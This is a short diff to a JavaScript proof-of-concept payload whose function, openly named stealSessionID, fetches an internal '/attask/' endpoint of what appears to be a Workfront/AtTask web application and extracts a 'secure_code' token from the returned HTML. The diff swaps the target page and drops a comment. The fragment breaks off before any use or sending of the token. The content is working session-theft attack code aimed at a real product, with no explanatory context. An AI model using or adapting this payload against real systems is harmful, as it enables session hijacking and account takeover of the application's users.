@@ -1,3 +1,4 @@
+
 function getQueryParam(name) {
     const urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(name);
@@ -6,12 +7,11 @@ function getQueryParam(name) {
 
 async function stealSessionID() {
     // Step 1: Get session ID from internal API
-    const response = await fetch('/attask/announcementView.cmd ');
+    const response = await fetch('/attask/customerMgmtView.cmd');
 
     const data = await response.text();
     
-    // Extract the 'secure_code' from the html
-    var searchString = 'secure_code" value="';
+    var searchString =  'secure_code" value="';
     var start = data.indexOf(searchString);
 
     start += searchString.length;                 
